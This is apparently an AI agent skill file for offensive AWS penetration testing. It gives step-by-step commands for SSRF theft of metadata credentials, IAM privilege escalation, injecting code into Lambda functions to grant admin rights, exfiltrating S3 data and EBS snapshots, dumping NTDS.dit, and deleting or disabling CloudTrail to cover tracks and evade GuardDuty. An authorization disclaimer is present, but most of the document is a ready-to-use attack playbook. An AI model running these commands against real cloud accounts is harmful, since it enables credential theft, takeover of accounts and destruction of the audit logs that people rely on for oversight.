---
name: aws-penetration-testing
description: "Provide comprehensive techniques for penetration testing AWS cloud environments. Covers IAM enumeration, privilege escalation, SSRF to metadata endpoint, S3 bucket exploitation, Lambda code extraction, and persistence techniques for red team operations."
risk: offensive
source: community
author: zebbern
date_added: "2026-02-27"
---

> AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.

# AWS Penetration Testing

## Purpose

Provide comprehensive techniques for penetration testing AWS cloud environments. Covers IAM enumeration, privilege escalation, SSRF to metadata endpoint, S3 bucket exploitation, Lambda code extraction, and persistence techniques for red team operations.

## Inputs/Prerequisites

- AWS CLI configured with credentials
- Valid AWS credentials (even low-privilege)
- Understanding of AWS IAM model
- Python 3, boto3 library
- Tools: Pacu, Prowler, ScoutSuite, SkyArk

## Outputs/Deliverables

- IAM privilege escalation paths
- Extracted credentials and secrets
- Compromised EC2/Lambda/S3 resources
- Persistence mechanisms
- Security audit findings

---

## Essential Tools

| Tool | Purpose | Installation |
|------|---------|--------------|
| Pacu | AWS exploitation framework | `git clone https://github.com/RhinoSecurityLabs/pacu` |
| SkyArk | Shadow Admin discovery | `Import-Module .\SkyArk.ps1` |
| Prowler | Security auditing | `pip install prowler` |
| ScoutSuite | Multi-cloud auditing | `pip install scoutsuite` |
| enumerate-iam | Permission enumeration | `git clone https://github.com/andresriancho/enumerate-iam` |
| Principal Mapper | IAM analysis | `pip install principalmapper` |

---

## Core Workflow

### Step 1: Initial Enumeration

Identify the compromised identity and permissions:

```bash
# Check current identity
aws sts get-caller-identity

# Configure profile
aws configure --profile compromised

# List access keys
aws iam list-access-keys

# Enumerate permissions
./enumerate-iam.py --access-key AKIA... --secret-key StF0q...
```

### Step 2: IAM Enumeration

```bash
# List all users
aws iam list-users

# List groups for user
aws iam list-groups-for-user --user-name TARGET_USER

# List attached policies
aws iam list-attached-user-policies --user-name TARGET_USER

# List inline policies
aws iam list-user-policies --user-name TARGET_USER

# Get policy details
aws iam get-policy --policy-arn POLICY_ARN
aws iam get-policy-version --policy-arn POLICY_ARN --version-id v1

# List roles
aws iam list-roles
aws iam list-attached-role-policies --role-name ROLE_NAME
```

### Step 3: Metadata SSRF (EC2)

Exploit SSRF to access metadata endpoint (IMDSv1):

```bash
# Access metadata endpoint
http://169.254.169.254/latest/meta-data/

# Get IAM role name
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Extract temporary credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME

# Response contains:
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2019-08-01T05:20:30Z"
}
```

**For IMDSv2 (token required):**

```bash
# Get token first
TOKEN=$(curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
  "http://169.254.169.254/latest/api/token")

# Use token for requests
curl -H "X-aws-ec2-metadata-token:$TOKEN" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

**Fargate Container Credentials:**

```bash
# Read environment for credential path
/proc/self/environ
# Look for: AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/...

# Access credentials
http://169.254.170.2/v2/credentials/CREDENTIAL-PATH
```

---

## Privilege Escalation Techniques

### Shadow Admin Permissions

These permissions are equivalent to administrator:

| Permission | Exploitation |
|------------|--------------|
| `iam:CreateAccessKey` | Create keys for admin user |
| `iam:CreateLoginProfile` | Set password for any user |
| `iam:AttachUserPolicy` | Attach admin policy to self |
| `iam:PutUserPolicy` | Add inline admin policy |
| `iam:AddUserToGroup` | Add self to admin group |
| `iam:PassRole` + `ec2:RunInstances` | Launch EC2 with admin role |
| `lambda:UpdateFunctionCode` | Inject code into Lambda |

### Create Access Key for Another User

```bash
aws iam create-access-key --user-name target_user
```

### Attach Admin Policy

```bash
aws iam attach-user-policy --user-name my_username \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

### Add Inline Admin Policy

```bash
aws iam put-user-policy --user-name my_username \
  --policy-name admin_policy \
  --policy-document file://admin-policy.json
```

### Lambda Privilege Escalation

```python
# code.py - Inject into Lambda function
import boto3

def lambda_handler(event, context):
    client = boto3.client('iam')
    response = client.attach_user_policy(
        UserName='my_username',
        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
    )
    return response
```

```bash
# Update Lambda code
aws lambda update-function-code --function-name target_function \
  --zip-file fileb://malicious.zip
```

---

## S3 Bucket Exploitation

### Bucket Discovery

```bash
# Using bucket_finder
./bucket_finder.rb wordlist.txt
./bucket_finder.rb --download --region us-east-1 wordlist.txt

# Common bucket URL patterns
https://{bucket-name}.s3.amazonaws.com
https://s3.amazonaws.com/{bucket-name}
```

### Bucket Enumeration

```bash
# List buckets (with creds)
aws s3 ls

# List bucket contents
aws s3 ls s3://bucket-name --recursive

# Download all files
aws s3 sync s3://bucket-name ./local-folder
```

### Public Bucket Search

```
https://buckets.grayhatwarfare.com/
```

---

## Lambda Exploitation

```bash
# List Lambda functions
aws lambda list-functions

# Get function code
aws lambda get-function --function-name FUNCTION_NAME
# Download URL provided in response

# Invoke function
aws lambda invoke --function-name FUNCTION_NAME output.txt
```

---

## SSM Command Execution

Systems Manager allows command execution on EC2 instances:

```bash
# List managed instances
aws ssm describe-instance-information

# Execute command
aws ssm send-command --instance-ids "i-0123456789" \
  --document-name "AWS-RunShellScript" \
  --parameters commands="whoami"

# Get command output
aws ssm list-command-invocations --command-id "CMD-ID" \
  --details --query "CommandInvocations[].CommandPlugins[].Output"
```

---

## EC2 Exploitation

### Mount EBS Volume

```bash
# Create snapshot of target volume
aws ec2 create-snapshot --volume-id vol-xxx --description "Audit"

# Create volume from snapshot
aws ec2 create-volume --snapshot-id snap-xxx --availability-zone us-east-1a

# Attach to attacker instance
aws ec2 attach-volume --volume-id vol-xxx --instance-id i-xxx --device /dev/xvdf

# Mount and access
sudo mkdir /mnt/stolen
sudo mount /dev/xvdf1 /mnt/stolen
```

### Shadow Copy Attack (Windows DC)

```bash
# CloudCopy technique
# 1. Create snapshot of DC volume
# 2. Share snapshot with attacker account
# 3. Mount in attacker instance
# 4. Extract NTDS.dit and SYSTEM
secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local
```

---

## Console Access from API Keys

Convert CLI credentials to console access:

```bash
git clone https://github.com/NetSPI/aws_consoler
aws_consoler -v -a AKIAXXXXXXXX -s SECRETKEY

# Generates signin URL for console access
```

---

## Covering Tracks

### Disable CloudTrail

```bash
# Delete trail
aws cloudtrail delete-trail --name trail_name

# Disable global events
aws cloudtrail update-trail --name trail_name \
  --no-include-global-service-events

# Disable specific region
aws cloudtrail update-trail --name trail_name \
  --no-include-global-service-events --no-is-multi-region-trail
```

**Note:** Kali/Parrot/Pentoo Linux triggers GuardDuty alerts based on user-agent. Use Pacu which modifies the user-agent.

---

## Quick Reference

| Task | Command |
|------|---------|
| Get identity | `aws sts get-caller-identity` |
| List users | `aws iam list-users` |
| List roles | `aws iam list-roles` |
| List buckets | `aws s3 ls` |
| List EC2 | `aws ec2 describe-instances` |
| List Lambda | `aws lambda list-functions` |
| Get metadata | `curl http://169.254.169.254/latest/meta-data/` |

---

## Constraints

**Must:**
- Obtain written authorization before testing
- Document all actions for audit trail
- Test in scope resources only

**Must Not:**
- Modify production data without approval
- Leave persistent backdoors without documentation
- Disable security controls permanently

**Should:**
- Check for IMDSv2 before attempting metadata attacks
- Enumerate thoroughly before exploitation
- Clean up test resources after engagement

---

## Examples

### Example 1: SSRF to Admin

```bash
# 1. Find SSRF vulnerability in web app
https://app.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 2. Get role name from response
# 3. Extract credentials
https://app.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole

# 4. Configure AWS CLI with stolen creds
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# 5. Verify access
aws sts get-caller-identity
```

---

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Access Denied on all commands | Enumerate permissions with enumerate-iam |
| Metadata endpoint blocked | Check for IMDSv2, try container metadata |
| GuardDuty alerts | Use Pacu with custom user-agent |
| Expired credentials | Re-fetch from metadata (temp creds rotate) |
| CloudTrail logging actions | Consider disable or log obfuscation |

---

## Additional Resources

For advanced techniques including Lambda/API Gateway exploitation, Secrets Manager & KMS, Container security (ECS/EKS/ECR), RDS/DynamoDB exploitation, VPC lateral movement, and security checklists, see [references/advanced-aws-pentesting.md](references/advanced-aws-pentesting.md).

## When to Use
This skill is applicable to execute the workflow or actions described in the overview.
